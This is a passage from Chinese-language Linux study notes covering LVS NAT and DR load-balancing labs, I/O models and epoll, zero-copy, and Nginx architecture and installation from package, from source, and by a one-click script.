WantedBy=multi-user.targe
#调用命令
[root@lvs ~]# /sbin/ipvsadm-save -n > /etc/sysconfig/ipvsadm
[root@lvs ~]# cat /etc/sysconfig/ipvsadm
#文件保存成功
-A -t 192.168.10.100:80 -s wrr
-a -t 192.168.10.100:80 -r 10.0.0.17:80 -m -w 5
-a -t 192.168.10.100:80 -r 10.0.0.67:80 -m -w 1
#设置为开机启动
[root@lvs ~]# systemctl enable ipvsadm.service
```

 **internet client：**

192.168.10.6

```
#1.修改网卡，删除网关和实验环境一样
[17:48:01 liu@ubuntu1804 ~]$ vim /etc/netplan/eth0.yaml
  version: 2
  renderer: networkd
  ethernets:
    eth0:
      addresses:
      - 192.168.10.6/24
      nameservers:
        search: [liusenbiao.com,liusenbiao.org]
        addresses: [180.76.76.76,223.6.6.6]、
[18:50:57 liu@ubuntu1804 ~]$netplan apply
#这个时候进入VMware里面把NAT模式设置成仅主机模式
#然后在Windows里把VMnet1网卡禁用在启用一下,然后用xshell连接就能连接上去了



#2.测试LVS轮询调度是否成功
[21:47:59 liu@ubuntu1804 ~]$curl 192.168.10.100
rs2 10.0.0.17 
[23:14:38 liu@ubuntu1804 ~]$curl 192.168.10.100
rs1 10.0.0.67
```

### 40.6 LVS的DR单网段实战(重点)

![1655542422264](linux体系.assets/1655542422264.png)

**环境准备：**

```
#0.LVS-DR模式单网段案例：
环境：五台主机
一台：客户端 eth0:仅主机 192.168.10.6/24 GW:192.168.10.200

一台：ROUTER：10.0.0.18
eth0 :NAT  10.0.0.200/24
eth1: 仅主机 192.168.10.200/24
启用 IP_FORWARD

一台：LVS
eth0:NAT:DIP:10.0.0.8/24 GW:10.0.0.200

两台RS：
RS1：eth0:NAT:10.0.0.7/24   GW：10.0.0.200
RS2：eth0:NAT:10.0.0.17/24 GW：10.0.0.200
```

**Real Server:**

10.0.0.7

```
#1.修改网关
[root@rs1 ~]# vim /etc/sysconfig/network-scripts/ifcfg-eth0
DEVICE=eth0
NAME=eth0
BOOTPROTO=static
IPADDR=10.0.0.7
PREFIX=24
GATEWAY=10.0.0.200
ONBOOT=yes
[root@rs1 ~]# route -n
[root@rs1 ~]#  route -n
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
0.0.0.0         10.0.0.200      0.0.0.0         UG    100    0        0 eth0
10.0.0.0        0.0.0.0 




#2.配置VIP(为了避免地址冲突)
[root@rs1 ~]# echo 1 > /proc/sys/net/ipv4/conf/all/arp_ignore
[root@rs1 ~]# echo 1 > /proc/sys/net/ipv4/conf/lo/arp_ignore
[root@rs1 ~]# echo 2 > /proc/sys/net/ipv4/conf/all/arp_announce 
[root@rs1 ~]# echo 2 > /proc/sys/net/ipv4/conf/lo/arp_announce 
[root@rs1 ~]# ifconfig lo:1 10.0.0.100/32
```

10.0.0.17

```
#1.修改网关
[root@rs2 ~]# vim /etc/sysconfig/network-scripts/ifcfg-eth0
DEVICE=eth0
NAME=eth0
BOOTPROTO=static
IPADDR=10.0.0.17
PREFIX=24
GATEWAY=10.0.0.200
ONBOOT=yes
[root@rs2 ~]# systemctl restart network
[root@rs2 ~]# route -n
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
0.0.0.0         10.0.0.200      0.0.0.0         UG    100    0        0 eth0
10.0.0.0        0.0.0.0         255.255.255.0   U     100    0        0 eth0




#2.配置VIP(为了避免地址冲突)
[root@rs2 ~]# echo 1 > /proc/sys/net/ipv4/conf/all/arp_ignore
[root@rs2 ~]# echo 1 > /proc/sys/net/ipv4/conf/lo/arp_ignore
[root@rs2 ~]# echo 2 > /proc/sys/net/ipv4/conf/all/arp_announce 
[root@rs2 ~]# echo 2 > /proc/sys/net/ipv4/conf/lo/arp_announce
[root@rs2 ~]# ifconfig lo:1 10.0.0.100/32
```

 **internet client：**

192.168.10.6

```
#1.修改网关
root@ubuntu1804:~# vim /etc/netplan/eth0.yaml
network:
  version: 2
  renderer: networkd
  ethernets:
    eth0:
      addresses:
      - 192.168.10.6/24
      gateway4: 192.168.10.200 #添加网关
      nameservers:
       search: [magedu.com, magedu.org]
       addresses: [180.76.76.76, 8.8.8.8, 1.1.1.1]]
       
       
root@ubuntu1804:~# netplan apply       
root@ubuntu1804:~# route -n
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
0.0.0.0         192.168.10.200  0.0.0.0         UG    0      0        0 eth0
192.168.10.0    0.0.0.0         255.255.255.0   U     0      0        0 eth0



#2.测试DR单网段连通性
[09:54:38 liu@ubuntu1804 ~]$while :;do curl 10.0.0.100;sleep 2;done
```

![1655564002752](linux体系.assets/1655564002752.png)

**ROUTER：**

10.0.0.200

```
#1.VMware添加网卡，模式改成仅主机模式


#2.修改网卡
#2.1配置网卡eth0
root@router:~# vim /etc/sysconfig/network-scripts/ifcfg-eth0
DEVICE=eth0
NAME=eth0
BOOTPROTO=static
IPADDR=10.0.0.200
PREFIX=24
ONBOOT=yes

#2.1配置网卡eth1
root@router:~# cp /etc/sysconfig/network-scripts/ifcfg-eth0 /etc/sysconfig/network-scripts/ifcfg-eth1
root@router:~# vim /etc/sysconfig/network-scripts/ifcfg-eth1
DEVICE=eth1
NAME=eth1
BOOTPROTO=static
IPADDR=192.168.10.200
PREFIX=24
ONBOOT=yes
root@router:~# nmcli connection up eth0
#xshell重连10.0.0.200





#3.测试连通性
#若能全部ping通，则连通性没有问题
root@router:~# ping 192.168.10.6
root@router:~# ping 10.0.0.7
root@router:~# ping 10.0.0.17
```

**LVS Server:**

10.0.0.8：

```
#1.安装包
[root@lvs ~]# dnf -y install ipvsadm



#2.修改网关
[root@lvs ~]# vim /etc/sysconfig/network-scripts/ifcfg-eth0
DEVICE=eth0
NAME=eth0
BOOTPROTO=static
IPADDR=10.0.0.8
PREFIX=24
GATEWAY=10.0.0.200
ONBOOT=yes
[root@lvs ~]# nmcli connection reload 
[root@lvs ~]# nmcli connection up eth0
[root@lvs ~]# route -n
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
0.0.0.0         10.0.0.200      0.0.0.0         UG    100    0        0 eth0
10.0.0.0        0.0.0.0         255.255.255.0   U     100    0        0 eth0





#3.配置回环网卡
[root@lvs ~]# ifconfig lo:1 10.0.0.100/32



#4.添加DR模式
[root@lvs ~]# ipvsadm -A -t 10.0.0.100:80 -s rr
[root@lvs ~]# ipvsadm -a -t 10.0.0.100:80 -r 10.0.0.67 -g
[root@lvs ~]# ipvsadm -a -t 10.0.0.100:80 -r 10.0.0.7 -g
[root@lvs ~]# ipvsadm -Ln
IP Virtual Server version 1.2.1 (size=4096)
Prot LocalAddress:Port Scheduler Flags
  -> RemoteAddress:Port           Forward Weight ActiveConn InActConn
TCP  10.0.0.100:80 rr        
  -> 10.0.0.7:80                 Route   1      0          0         
  -> 10.0.0.67:80                 Route   1      0          0 
```

### 40.7LVS的DR多网段实战(重点)

![1655565542294](linux体系.assets/1655565542294.png)

**LVS Server:**

10.0.0.8：

```
#1.在先前实验的基础上配置eth0网卡
root@router:~# ip a a 172.16.0.200/24 dev eth0 label eth0:1
root@router:~# route -n
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
10.0.0.0        0.0.0.0         255.255.255.0   U     102    0        0 eth0
172.16.0.0      0.0.0.0         255.255.255.0   U     0      0        0 eth0
192.168.10.0    0.0.0.0         255.255.255.0   U     101    0        0 eth1




#2.脚本化实现调度规则
[root@lvs ~]# vim lvs.sh
#!/bin/bash
vip='172.16.0.100'
iface='lo:1'
mask='255.255.255.255'
port='80'
rs1='10.0.0.67'
rs2='10.0.0.17'
scheduler='wrr'
type='-g'
rpm -q ipvsadm &> /dev/null || yum -y install ipvsadm &> /dev/null

case $1 in
start)
    ifconfig $iface $vip netmask $mask #broadcast $vip up
    iptables -F
 
    ipvsadm -A -t ${vip}:${port} -s $scheduler
    ipvsadm -a -t ${vip}:${port} -r ${rs1} $type -w 1
    ipvsadm -a -t ${vip}:${port} -r ${rs2} $type -w 1
    echo "The VS Server is Ready!"
    ;;
stop)
    ipvsadm -C
    ifconfig $iface down
    echo "The VS Server is Canceled!"
    ;;
*)
    echo "Usage: $(basename $0) start|stop"
    exit 1
    ;;
esac

[root@lvs ~]# bash lvs.sh start




#3.LVS的lo:VIP:172.16.0.100/32可不可以配置成172.16.0.100/24？
答：不可以，根据回环网卡的特性，配置成172.16.0.100/24，子网掩码255.255.255.0，你只要172.16.0.*任意的网段都ping的通，认为都是在同一个网段，发送的包只能在内核自身内部打转，根本发不出去。如果配置成172.16.0.100/32，只要跟172.16.0.100不一样的地址都认为不是在同一个网段，转发过来的包才能进行通讯，所以能够走外部网络！！！如果VIP绑定在eth0上，可以使用其他的netmask.
```

**Real Server:**

10.0.0.7：

```
#1.关键两步：改内核参数，把vip绑定到回环网卡上
#脚本化执行
#!/bin/bash
vip=172.16.0.100
mask='255.255.255.255'
dev=lo:1

case $1 in
start)
    echo 1 > /proc/sys/net/ipv4/conf/all/arp_ignore
    echo 1 > /proc/sys/net/ipv4/conf/lo/arp_ignore
    echo 2 > /proc/sys/net/ipv4/conf/all/arp_announce
    echo 2 > /proc/sys/net/ipv4/conf/lo/arp_announce
    ifconfig $dev $vip netmask $mask
    echo "The RS Server is Ready!"
    ;;
stop)
    ifconfig $dev down
    echo 0 > /proc/sys/net/ipv4/conf/all/arp_ignore
    echo 0 > /proc/sys/net/ipv4/conf/lo/arp_ignore
    echo 0 > /proc/sys/net/ipv4/conf/all/arp_announce
    echo 0 > /proc/sys/net/ipv4/conf/lo/arp_announce
    echo "The RS Server is Canceled!"
    ;;
*)
    echo "Usage: $(basename $0) start|stop"
    exit 1
    ;;
esac

[root@rs1 ~]# bash lvs_rs.sh start
```

10.0.0.17：

```
#1.关键两步：改内核参数，把vip绑定到回环网卡上
#脚本化执行
#!/bin/bash
vip=172.16.0.100
mask='255.255.255.255'
dev=lo:1

case $1 in
start)
    echo 1 > /proc/sys/net/ipv4/conf/all/arp_ignore
    echo 1 > /proc/sys/net/ipv4/conf/lo/arp_ignore
    echo 2 > /proc/sys/net/ipv4/conf/all/arp_announce
    echo 2 > /proc/sys/net/ipv4/conf/lo/arp_announce
    ifconfig $dev $vip netmask $mask
    echo "The RS Server is Ready!"
    ;;
stop)
    ifconfig $dev down
    echo 0 > /proc/sys/net/ipv4/conf/all/arp_ignore
    echo 0 > /proc/sys/net/ipv4/conf/lo/arp_ignore
    echo 0 > /proc/sys/net/ipv4/conf/all/arp_announce
    echo 0 > /proc/sys/net/ipv4/conf/lo/arp_announce
    echo "The RS Server is Canceled!"
    ;;
*)
    echo "Usage: $(basename $0) start|stop"
    exit 1
    ;;
esac

[root@rs1 ~]# bash lvs_rs.sh start
```

 **internet client：**

192.168.10.6

```
#1.测试DR多网段连通性
[09:54:38 liu@ubuntu1804 ~]$while :;do curl 172.16.0.100;sleep 1;done
```

![1655605087235](linux体系.assets/1655605087235.png)

### 40.8 LVS持久连接

```
#1.持久连接的定义：
持久连接：新用户连接发到新的机器上，老用户连接在规定的时间内还是发到原先的机器上



#2.案例：
[root@lvs ~]#ipvsadm -E -f 10 -p 
[root@lvs ~]#ipvsadm -Ln
IP Virtual Server version 1.2.1 (size=4096)
Prot LocalAddress:Port Scheduler Flags
  -> RemoteAddress:Port           Forward Weight ActiveConn InActConn
FWM  10 wlc persistent 360
  -> 10.0.0.7:0               Route   1      0          15        
  -> 10.0.0.17:0             Route   1      0          7         
[root@lvs ~]#ipvsadm -E -f 10 -p 3600
[root@lvs ~]#ipvsadm -Ln
IP Virtual Server version 1.2.1 (size=4096)
Prot LocalAddress:Port Scheduler Flags
  -> RemoteAddress:Port           Forward Weight ActiveConn InActConn
FWM  10 wlc persistent 3600
  -> 10.0.0.7:0               Route   1      0          79        
  -> 10.0.0.17:0             Route   1      0          7
```

## 41.高性能Nginx服务

### 41.1 I/O 模型

#### 41.1.1 I/O模型相关概念

```
同步/异步：关注的是消息通信机制，即调用者在等待一件事情的处理结果时，被调用者是否提供完成状态的通知。

同步：synchronous，被调用者并不提供事件的处理结果相关的通知消息，需要调用者主动询问事情是否处理完成
异步：asynchronous，被调用者通过状态、通知或回调机制主动通知调用者被调用者的运行状态
```

![1655610025372](linux体系.assets/1655610025372.png)

```
阻塞/非阻塞：关注调用者在等待结果返回之前所处的状态

阻塞：blocking，指IO操作需要彻底完成后才返回到用户空间，调用结果返回之前，调用者被挂起，干不了别的事情。
非阻塞：nonblocking，指IO操作被调用后立即返回给用户一个状态值，而无需等到IO操作彻底完
成，在最终的调用结果返回之前，调用者不会被挂起，可以去做别的事情。



异步阻塞：就等于你啥也不干盯着水壶，但是没什么意义，因为水壶烧开了自然会通知我。

异步非阻塞：一个人在等烧水壶水烧开，水没有烧开之前这个人可以去干一些事情，因为他是买的水壶是响壶，如果水壶烧开了以后会发出声音来通知你水壶已经烧开了，所以不必一直呆在水壶前或者一直过一段时间查看一次。
```

![1655610108208](linux体系.assets/1655610108208.png)

#### 41.1.2网络 I/O模型

**宏观架构：**

![1655609671685](linux体系.assets/1655609671685.png)

```
#1.五种模型
阻塞型、非阻塞型、复用型、信号驱动型、异步
```

##### 41.1.2.1 阻塞型I/O模型

![1655610924095](linux体系.assets/1655610924095.png)

```
#1.同步阻塞概念：
相当于同步阻塞：同步阻塞的含义通俗的来说就是，一个人在等烧水壶水烧开，水没有烧开之前这个人哪里都不能去，只能一直等到水烧开为止才能去做别的事情



#2.阻塞型I/O模型优缺点：
阻塞IO模型是最简单的I/O模型，用户线程在内核进行IO操作时被阻塞
用户线程通过系统调用read发起I/O读操作，由用户空间转到内核空间。内核等到数据包到达后，然后将接收的数据拷贝到用户空间，完成read操作
用户需要等待read将数据读取到buffer后，才继续处理接收的数据。整个I/O请求的过程中，用户线程是被阻塞的，这导致用户在发起IO请求时，不能做任何事情，对CPU的资源利用率不够
优点：程序简单，在阻塞等待数据期间进程/线程挂起，基本不会占用 CPU 资源
缺点：每个连接需要独立的进程/线程单独处理，当并发请求量大时为了维护程序，内存、线程切换开销较大，apache 的preforck使用的是这种模式。
```

##### 41.1.2.2非阻塞型I/O模型

![1655611482293](linux体系.assets/1655611482293.png)

```
#1.同步非阻塞概念：同步阻塞的含义通俗的来说就是，一个人在等烧水壶水烧开，水没有烧开之前这个人可以离开去干一些别的事情，但是水烧开不会通知这个人水已经烧开了，所以这个人只能干一些活去检查一次水烧开了没有，一直这么轮询，直到所有的水全部烧开位置才结束。



#2.非阻塞型I/O模型优缺点：
当一个应用进程这样循环调用 recvfrom 时，称之为轮询 polling。这么做往往会耗费大量CPU时间，实际使用很少
```

##### 41.1.2.3多路复用I/O型

![1655612474914](linux体系.assets/1655612474914.png)

```
#1.多路复用I/O型概念：
在非阻塞型I/O模型的基础上加了一个代理应用程序帮你不断的轮询数据是否结束。



#2.优缺点：
优点：可以基于一个阻塞对象，同时在多个描述符上等待就绪，而不是使用多个线程(每个文件描述符一个线程)，这样可以大大节省系统资源

缺点：当连接数较少时效率相比多线程+阻塞 I/O 模型效率较低，可能延迟更大，因为单个连接处理需要 2 次系统调用，占用时间会有增加。




#3.适用场景：
当客户端处理多个描述符时（一般是交互式输入和网络套接口），必须使用I/O复用
当一个客户端同时处理多个套接字时，此情况可能的但很少出现
当一个服务器既要处理监听套接字，又要处理已连接套接字，一般也要用到I/O复用
当一个服务器即要处理TCP，又要处理UDP，一般要使用I/O复用
当一个服务器要处理多个服务或多个协议，一般要使用I/O复用
```

##### 41.1.2.4信号驱动式I/O模型

![1655614961508](linux体系.assets/1655614961508.png)

```
#1.异步阻塞的概念
异步阻塞：就等于你啥也不干盯着水壶，但是没什么意义，因为水壶烧开了自然会通知我。



#2.信号驱动I/O的概念
信号驱动I/O的意思就是我们现在不用傻等着了，也不用去轮询。而是让内核在数据就绪时，发送信号通知我们。

调用的步骤是，通过系统调用 sigaction ，并注册一个信号处理的回调函数，该调用会立即返回，然后主程序可以继续向下执行，当有I/O操作准备就绪,即内核数据就绪时，内核会为该进程产生一个SIGIO 信号，并回调注册的信号回调函数，这样就可以在信号回调函数中系统调用 recvfrom 获取数据,将用户进程所需要的数据从内核空间拷贝到用户空间


此模型的优势在于等待数据报到达期间进程不被阻塞。用户主程序可以继续执行，只要等待来自信号处理函数的通知。
在信号驱动式 I/O 模型中，应用程序使用套接口进行信号驱动 I/O，并安装一个信号处理函数，进程继续运行并不阻塞
当数据准备好时，进程会收到一个 SIGIO 信号，可以在信号处理函数中调用 I/O 操作函数处理数据。




#.信号驱动I/O优缺点
优点：线程并没有在等待数据时被阻塞，内核直接返回调用接收信号，不影响进程继续处理其他请求因此可以提高资源的利用率
缺点：信号 I/O 在大量 IO 操作时可能会因为信号队列溢出导致没法通知
异步阻塞：就等于你啥也不干盯着水壶，但是没什么意义，因为水壶烧开了自然会通知我。
```

##### 41.1.2.5异步I/O模型

![1655633923245](linux体系.assets/1655633923245.png)

```
#1.异步非阻塞概念
异步非阻塞：一个人在等烧水壶水烧开，水没有烧开之前这个人可以去干一些事情，因为他是买的水壶是响壶，如果水壶烧开了以后会发出声音来通知你水壶已经烧开了，所以不必一直呆在水壶前或者一直过一段时间查看一次。




#2.5异步I/O模型优缺点
优点：异步 I/O 能够充分利用 DMA 特性，让 I/O 操作与计算重叠
缺点：要实现真正的异步 I/O，操作系统需要做大量的工作。目前 Windows 下通过 IOCP 实现了真正的异步 I/O，在 Linux 系统下，Linux 2.6才引入，目前 AIO 并不完善，因此在 Linux 下实现高并发网络编程时以 IO 复用模型模式+多线程任务的架构基本可以满足需求
Linux提供了AIO库函数实现异步，但是用的很少。目前有很多开源的异步IO库，例如libevent、libev、libuv。
```

#### 41.1.3五种IO对比

![1655634184551](linux体系.assets/1655634184551.png)

#### 41.1.4 I/O的具体实现方式

![1655634721251](linux体系.assets/1655634721251.png)

```
Select：(apache)
POSIX所规定，目前几乎在所有的平台上支持，其良好跨平台支持也是它的一个优点，本质上是通过设置或者检查存放fd标志位的数据结构来进行下一步处理
缺点
单个进程能够监视的文件描述符的数量存在最大限制，在Linux上一般为1024，可以通过修改宏定义FD_SETSIZE，再重新编译内核实现，但是这样也会造成效率的降低
单个进程可监视的fd数量被限制，默认是1024，修改此值需要重新编译内核
对socket是线性扫描，即采用轮询的方法，效率较低
select 采取了内存拷贝方法来实现内核将 FD 消息通知给用户空间，这样一个用来存放大量fd的数据结构，这样会使得用户空间和内核空间在传递该结构时复制开销大




poll：
本质上和select没有区别，它将用户传入的数组拷贝到内核空间，然后查询每个fd对应的设备状态其没有最大连接数的限制，原因是它是基于链表来存储的
大量的fd的数组被整体复制于用户态和内核地址空间之间，而不管这样的复制是不是有意义
poll特点是“水平触发”，如果报告了fd后，没有被处理，那么下次poll时会再次报告该fd 
select是边缘触发即只通知一次





epoll：(Nginx) 在Linux 2.6内核中提出的select和poll的增强版本
支持水平触发LT和边缘触发ET，最大的特点在于边缘触发，它只告诉进程哪些fd刚刚变为就需态，并且只会通知一次
使用“事件”的就绪通知方式，通过epoll_ctl注册fd，一旦该fd就绪，内核就会采用类似callback的回调机制来激活该fd，epoll_wait便可以收到通知
优点:
没有最大并发连接的限制：能打开的FD的上限远大于1024(1G的内存能监听约10万个端口)，具体查看/proc/sys/fs/file-max，此值和系统内存大小相关
效率提升：非轮询的方式，不会随着FD数目的增加而效率下降;只有活跃可用的FD才会调用callback函数，即epoll最大的优点就在于它只管理“活跃”的连接，而跟连接总数无关
内存拷贝，利用mmap(Memory Mapping)加速与内核空间的消息传递;即epoll使用mmap减少复制开销
```

### 41.2零拷贝

#### 41.2.1零拷贝介绍

![1655635639074](linux体系.assets/1655635639074.png)

```
#1.传统上的问题
传统的 Linux 系统的标准 I/O 接口（read、write）是基于数据拷贝的，也就是数据都是 copy_to_user 或者 copy_from_user，这样做的好处是，通过中间缓存的机制，减少磁盘 I/O 的操作，但是坏处也很
明显，大量数据的拷贝，用户态和内核态的频繁切换，会消耗大量的 CPU 资源，严重影响数据传输的性能，统计表明，在Linux协议栈中，数据包在内核态和用户态之间的拷贝所用的时间甚至占到了数据
包整个处理流程时间的57.1%



#2.零拷贝概念
零拷贝就是上述问题的一个解决方案，通过尽量避免拷贝操作来缓解 CPU 的压力。零拷贝并没有真正做到“0”拷贝，它更多是一种思想，很多的零拷贝技术都是基于这个思想去做的优化
```

#### 41.2.2零拷页相关技术

##### 41.2.2.1 MMAP (Memory Mapping)

![1655635728469](linux体系.assets/1655635728469.png)

```
mmap()系统调用使得进程之间通过映射同一个普通文件实现共享内存。普通文件被映射到进程地址空间后，进程可以向访问普通内存一样对文件进行访问。
mmap是一种内存映射文件的方法，即将一个文件或者其它对象映射到进程的地址空间，实现文件磁盘地址和进程虚拟地址空间中一段虚拟地址的一一对映关系。
实现这样的映射关系后，进程就可以采用指针的方式读写操作这一段内存，而系统会自动回写脏页面到对应的文件磁盘上，即完成了对文件的操作而不必再调用read,write等系统调用函数。相反，内核空间对这段区域的修改也直接反映用户空间，从而可以实现不同进程间的文件共享。
内存映射减少数据在用户空间和内核空间之间的拷贝操作,适合大量数据传输
```

##### 41.2.2.2 SENDFILE

![1655636141484](linux体系.assets/1655636141484.png)

##### 41.2.2.3DMA硬件辅助的SENDFILE

![1655636234151](linux体系.assets/1655636234151.png)



### 41.3 Nginx架构和安装

#### 41.3.1Nginx架构

**整体架构：**

![1655772307662](linux体系.assets/1655772307662.png)

**工作细节：**

![1655772943661](linux体系.assets/1655772943661.png)

#### 41.3.2Nginx进程间通信

![1655773093913](linux体系.assets/1655773093913.png)

```
工作进程是由主进程生成的，主进程使用fork()函数，在Nginx服务器启动过程中主进程根据配置文件决定启动工作进程的数量，然后建立一张全局的工作表用于存放当前未退出的所有的工作进程，主进程生成工作进程后会将新生成的工作进程加入到工作进程表中，并建立一个单向的管道并将其传递给工作进程，该管道与普通的管道不同，它是由主进程指向工作进程的单向通道，包含了主进程向工作进程发出的指令、工作进程ID、工作进程在工作进程表中的索引和必要的文件描述符等信息。

主进程与外界通过信号机制进行通信，当接收到需要处理的信号时，它通过管道向相关的工作进程发送正确的指令，每个工作进程都有能力捕获管道中的可读事件，当管道中有可读事件的时候，工作进程就会从管道中读取并解析指令，然后采取相应的执行动作，这样就完成了主进程与工作进程的交互。
```

#### 41.3.3 HTTP处理过程

```
Nginx 启动时，Master 进程，加载配置文件
Master 进程，初始化监听的 socket
Master 进程，fork 出多个 Worker 进程
Worker 进程，竞争新的连接，获胜方通过三次握手，建立 Socket连接，并处理请求
```

![1655773423179](linux体系.assets/1655773423179.png)

#### 41.3.4Nginx编译安装

```
#1.官方包源安装最新版本nginx
官方源网址：https://nginx.org/en/linux_packages.html#RHEL-CentOS

#1.1.配置epel源
[root@centos8 ~]# vim /etc/yum.repos.d/nginx.repo
[nginx-stable]
name=nginx stable repo
baseurl=http://nginx.org/packages/centos/$releasever/$basearch/
gpgcheck=1
enabled=1
gpgkey=https://nginx.org/keys/nginx_signing.key
module_hotfixes=true

[nginx-mainline]
name=nginx mainline repo
baseurl=http://nginx.org/packages/mainline/centos/$releasever/$basearch/
gpgcheck=1
enabled=0
gpgkey=https://nginx.org/keys/nginx_signing.key
module_hotfixes=true

#1.2安装最新版nginx
[root@centos8 ~]# yum -y install nginx
[root@centos8 ~]# systemctl enable --now nginx







#2.编译安装Nginx
#2.1创建相关包
[root@centos8 ~]# yum -y install gcc pcre-devel openssl-devel zlib-devel
#创建nginx的专有用户
[root@centos8 ~]# useradd -s /sbin/nologin nginx


#2.2下载源码并压缩
[root@centos8 ~]# wget http://nginx.org/download/nginx-1.18.0.tar.gz
[root@centos8 ~]# tar xf nginx-1.18.0.tar.gz
[root@centos8 ~]# cd nginx-1.18.0/


#2.3进行编译安装
[root@centos8 nginx-1.18.0]# ./configure --help #后续自己添加指定的需求
[root@centos8 nginx-1.18.0]# ./configure --prefix=/apps/nginx \
--user=nginx \
--group=nginx \
--with-http_ssl_module \
--with-http_v2_module \
--with-http_realip_module \
--with-http_stub_status_module \
--with-http_gzip_static_module \
--with-pcre \
--with-stream \
--with-stream_ssl_module \
--with-stream_realip_module
[root@centos8 nginx-1.18.0]# make && make install


#2.4查看版本
[root@centos8 nginx-1.18.0]# ./objs/nginx -v
nginx version: nginx/1.18.0


#2.5创建nginx软连接
[root@centos8 sbin]# ln -s /apps/nginx/sbin/nginx /usr/sbin/

#2.6修改权限
[root@centos8 nginx-1.18.0]#chown -R nginx.nginx /apps/nginx


#2.7创建Nginx自启动文件
[root@centos8 nginx-1.20.1]# vim /usr/lib/systemd/system/nginx.service
[Unit]
Description=nginx - high performance web server
Documentation=http://nginx.org/en/docs/
After=network-online.target remote-fs.target nss-lookup.target
Wants=network-online.target

[Service]
Type=forking
PIDFile=/apps/nginx/run/nginx.pid
ExecStart=/usr/sbin/nginx -c /apps/nginx/conf/nginx.conf
ExecReload=/bin/sh -c "/bin/kill -s HUP $(/bin/cat /apps/nginx/run/nginx.pid)"
ExecStop=/bin/sh -c "/bin/kill -s TERM $(/bin/cat /apps/nginx/run/nginx.pid)"

[Install]
WantedBy=multi-user.target


#2.8创建目录
[root@centos8 ~]# mkdir /apps/nginx/run/
[root@centos8 ~]# chown -R nginx.nginx /apps/nginx/run/


#2.9修改配置文件
[root@centos8 ~]# vim /apps/nginx/conf/nginx.conf
pid   /apps/nginx/run/nginx.pid; #注释取消


#2.10启动服务
[root@centos8 nginx-1.18.0]# systemctl daemon-reload
[root@centos8 nginx-1.18.0]# killall nginx
[root@centos8 nginx-1.18.0]# systemctl enable --now nginx
[root@centos8 nginx-1.18.0]# ll /apps/nginx/run/
total 4
-rw-r--r-- 1 root root 6 Jun 21 10:44 nginx.pid
```

![1655778822624](linux体系.assets/1655778822624.png)

#### 41.3.5一键编译安装Nginx脚本

```
#!/bin/bash
#
#********************************************************************
#Author:			liusenbiao
#Date: 				2022-06-21
#FileName：			install_nginx.sh
#URL: 				http://www.liusenbiao.com
#Description：		The test script
#********************************************************************
SRC_DIR=/usr/local/src
NGINX_URL=http://nginx.org/download/
NGINX_FILE=nginx-1.18.0
TAR=.tar.gz
NGINX_INSTALL_DIR=/apps/nginx
CPUS=`lscpu |awk '/^CPU\(s\)/{print $2}'`

color () {
    RES_COL=60
    MOVE_TO_COL="echo -en \\033[${RES_COL}G"
    SETCOLOR_SUCCESS="echo -en \\033[1;32m"
    SETCOLOR_FAILURE="echo -en \\033[1;31m"
    SETCOLOR_WARNING="echo -en \\033[1;33m"
    SETCOLOR_NORMAL="echo -en \E[0m"
    echo -n "$1" && $MOVE_TO_COL
    echo -n "["
    if [ $2 = "success" -o $2 = "0" ] ;then
        ${SETCOLOR_SUCCESS}
        echo -n $"  OK  "    
    elif [ $2 = "failure" -o $2 = "1"  ] ;then 
        ${SETCOLOR_FAILURE}
        echo -n $"FAILED"
    else
        ${SETCOLOR_WARNING}
        echo -n $"WARNING"
    fi
    ${SETCOLOR_NORMAL}
    echo -n "]"
    echo 
}

os_type () {
   awk -F'[ "]' '/^NAME/{print $2}' /etc/os-release
}

os_version () {
   awk -F'"' '/^VERSION_ID/{print $2}' /etc/os-release
}

check () {
    [ -e ${NGINX_INSTALL_DIR} ] && { color "nginx 已安装,请卸载后再安装" 1; exit; }
    cd  ${SRC_DIR}
    if [  -e ${NGINX_FILE}${TAR} ];then
        color "相关文件已准备好" 0
    else
        color '开始下载 nginx 源码包' 0
        yum -y install wget
        wget ${NGINX_URL}${NGINX_FILE}${TAR} 
        [ $? -ne 0 ] && { color "下载 ${NGINX_FILE}${TAR}文件失败" 1; exit; } 
    fi
} 

install () {
    color "开始安装 nginx" 0
    if id nginx  &> /dev/null;then
        color "nginx 用户已存在" 1 
    else
        useradd -s /sbin/nologin -r  nginx
        color "创建 nginx 用户" 0 
    fi
    color "开始安装 nginx 依赖包" 0
    if [ `os_type` == "CentOS" -a `os_version` == '8' ] ;then
        yum -y -q install make gcc-c++ libtool pcre pcre-devel zlib zlib-devel openssl openssl-devel perl-ExtUtils-Embed 
    elif [ `os_type` == "CentOS" -a `os_version` == '7' ];then
        yum -y -q  install make gcc pcre-devel openssl-devel zlib-devel perl-ExtUtils-Embed
    else
        apt update &> /dev/null
        apt -y install make gcc libpcre3 libpcre3-dev openssl libssl-dev zlib1g-dev &> /dev/null
    fi
    cd $SRC_DIR
    tar xf ${NGINX_FILE}${TAR}
    NGINX_DIR=`echo ${NGINX_FILE}${TAR}| sed -nr 's/^(.*[0-9]).*/\1/p'`
    cd ${NGINX_DIR}
    ./configure --prefix=${NGINX_INSTALL_DIR} --user=nginx --group=nginx --with-http_ssl_module --with-http_v2_module --with-http_realip_module --with-http_stub_status_module --with-http_gzip_static_module --with-pcre --with-stream --with-stream_ssl_module --with-stream_realip_module 
    make -j $CPUS && make install 
    [ $? -eq 0 ] && color "nginx 编译安装成功" 0 ||  { color "nginx 编译安装失败,退出!" 1 ;exit; }
    echo "PATH=${NGINX_INSTALL_DIR}/sbin:${PATH}" > /etc/profile.d/nginx.sh
    cat > /lib/systemd/system/nginx.service <<EOF
[Unit]
Description=The nginx HTTP and reverse proxy server
After=network.target remote-fs.target nss-lookup.target

[Service]
Type=forking
PIDFile=${NGINX_INSTALL_DIR}/logs/nginx.pid
ExecStartPre=/bin/rm -f ${NGINX_INSTALL_DIR}/logs/nginx.pid
ExecStartPre=${NGINX_INSTALL_DIR}/sbin/nginx -t
ExecStart=${NGINX_INSTALL_DIR}/sbin/nginx
ExecReload=/bin/kill -s HUP \$MAINPID
KillSignal=SIGQUIT
TimeoutStopSec=5
KillMode=process
PrivateTmp=true

[Install]
WantedBy=multi-user.target
EOF
    systemctl daemon-reload
    ln -s /apps/nginx/sbin/nginx /usr/sbin/
    systemctl enable --now nginx &> /dev/null 
